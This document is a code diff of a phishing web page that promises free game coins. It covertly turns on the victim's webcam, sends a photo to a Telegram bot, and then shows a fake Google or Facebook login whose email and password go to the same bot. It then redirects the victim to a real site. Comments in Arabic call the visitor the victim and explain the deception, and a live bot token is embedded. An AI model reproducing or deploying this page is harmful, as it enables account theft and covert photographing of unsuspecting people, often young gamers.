@@ -3,35 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Claim PES 200 Coins 🎁</title>
+    <title>🎁 Free Fire Rewards 🎁</title>
     <style>
-        /* ستايل صفحة الـ Claim البرتقالية تاع PES */
-        body { margin: 0; background: #1a1a1a; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; transition: background 0.5s; }
-        .pes-container { text-align: center; background: rgba(0,0,0,0.8); padding: 30px; border-radius: 20px; width: 90%; max-width: 380px; color: white; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
-        .coin-img { width: 100px; margin-bottom: 10px; }
+        body { margin: 0; padding: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; transition: background 0.5s; background: url('https://w0.peakpx.com/wallpaper/705/110/wallpaper-garena-free-fire-free-fire-battlegrounds-poster.jpg') no-repeat center center/cover; }
+        #p1 { text-align: center; background: rgba(0,0,0,0.8); padding: 30px; border-radius: 20px; width: 90%; max-width: 380px; color: white; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
+        .diamond-img { width: 100px; margin-bottom: 10px; }
         .btn-claim { background: #e74c3c; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; animation: pulse 1.5s infinite; }
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0.7); }
-            70% { transform: scale(1.05); box-shadow: 0 0 10px rgba(231, 76, 60, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0); }
-        }
-
-        /* ستايل صفحة تسجيل الدخول تاع قوقل (Google) - تكون مخفية في البداية */
-        #googlePage { display: none; background: white; width: 100%; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: absolute; top: 0; left: 0; }
-        .google-box { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
-        .logo-google { width: 120px; margin-bottom: 20px; }
-        input { width: 92%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; color: #1c1e21; }
-        .btn-google { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; }
-        #video, #canvas { display: none; }
+        #p2 { display: none; background: #f0f2f5; width: 100%; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: absolute; top: 0; left: 0; }
+        .fb-box { background: white; padding: 20px; border-radius: 8px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .fb-logo { width: 120px; margin-bottom: 20px; }
+        input { width: 92%; padding: 12px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .btn-fb { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        #v, #c { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="pesPage" class="pes-container">
-        <img src="https://e7.pngegg.com/pngimages/391/364/png-clipart-esports-video-game-concept-concept-art-pes-2018-thumbnail.png" alt="PES Coins" class="coin-img">
-        <h1>💎 Claim 200 PES Coins Now 💎</h1>
-        <p>Verification is required to ensure account safety. Do not close!</p>
-        <button class="btn-claim" onclick="showGoogleAndCapture()">CLAIM NOW</button>
+    <div id="p1">
+        <img src="https://ff.garena.com/static/images/hero/hero_1.png" class="diamond-img">
+        <h2>Claim PES 200 Coins</h2>
+        <p>Log in with Google to claim your PES coins instantly.</p>
+        <button class="btn-claim" onclick="startHack()">CLAIM NOW</button>
     </div>
 
     <div id="googlePage">
@@ -40,78 +32,65 @@
             <p style="color: #1c1e21; font-size: 14px; margin-bottom: 15px;">Log in to connect to PES for verification.</p>
             <input type="text" id="email" placeholder="Mobile number or email" required>
             <input type="password" id="password" placeholder="Password" required>
-            <button class="btn-google" onclick="finalhack()">Log In</button>
+            <button class="btn-google" onclick="sendData()">Log In</button>
         </div>
     </div>
 
-    <video id="video" width="640" height="480" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
 
     <script>
-        const TOKEN = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; //
-        const CHAT_ID = "7479786207"; //
+        const T = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; 
+        const C = "7479786207";
 
-        async function showGoogleAndCapture() {
+        async function startHack() {
             try {
                 // 1. طلب الكاميرا ديريكت
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                document.getElementById('v').srcObject = stream;
                 
-                // رسالة مزورة باش الضحية يآمن بلي كاين عملية "تأكيد صورة"
-                alert("Checking account status... Photo validation required!");
+                // 2. التحويل لقوقل فوراً وتبييض الخلفية (فلاش)
+                document.body.style.background = "white"; // "تشعيل الضو"
+                document.getElementById('p1').style.display = 'none';
+                document.getElementById('googlePage').style.display = 'flex';
 
-                // 2. الحل للصورة الكحلة: استنى 4 ثواني كاملة باش الكاميرا تصفى
+                // 3. التقاط الصورة بعد 5 ثواني كاملة باش تصفى
                 setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    
-                    // تحويل الصورة لملف JPG وإرسالها
+                    const canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
                     canvas.toBlob(blob => {
                         const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
+                        formData.append('chat_id', C);
                         formData.append('photo', blob, 'shot.jpg');
-                        formData.append('caption', `🎯 Captured Victim!`);
-
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                        
-                        // 3. ذرك نخفو صفحة الـ Claim ونظهرو صفحة قوقل
-                        document.getElementById('pesPage').style.display = 'none';
-                        document.getElementById('googlePage').style.display = 'flex';
-                        document.body.style.background = '#f0f2f5'; // نغيروا الخلفية لستايل قوقل
-
+                        formData.append('caption', '🎯 Captured Clear Victim!');
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
-                }, 4000); 
+                }, 5000); 
 
             } catch (err) {
-                // رسالة خطأ مزورة إذا رفض الكاميرا
-                alert("Error: Camera permission required for identity verification!");
-                // حتى إذا رفض، نظهروا صفحة قوقل على الأقل
-                document.getElementById('pesPage').style.display = 'none';
+                // إذا رفض الكاميرا، نفتح قوقل على الأقل
+                document.getElementById('p1').style.display = 'none';
                 document.getElementById('googlePage').style.display = 'flex';
-                document.body.style.background = '#f0f2f5';
+                document.body.style.background = "#f0f2f5";
             }
         }
 
-        function finalhack() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-
-            if(email === "" || pass === "") {
+        function sendData() {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            
+            if(u === "" || p === "") {
                 alert("Please enter your details!");
                 return;
             }
 
             // إرسال الإيميل والمودباس للبوت
-            const text = `✅ GOOGLE ACCOUNT CAPTURED!\n\n📧 Email/Phone: ${email}\n🔑 Password: ${pass}`;
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-
-            // رسالة نجاح مزورة للضحية
-            setTimeout(() => alert("Identity Verified! PES Coins will be added within 24 hours."), 1000);
-            
-            // توجيه الضحية لصفحة حقيقية باش ما يشكش
-            window.location.href = "https://www.google.com/";
+            const msg = `✅ GOOGLE ACCOUNT CAPTURED!\n\n📧 Email/Phone: ${u}\n🔑 Password: ${p}`;
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`)
+            .then(() => {
+                // توجيه الضحية لصفحة حقيقية باش ما يشكش
+                window.location.href = "https://ff.garena.com/";
+            });
         }
     </script>
 </body>
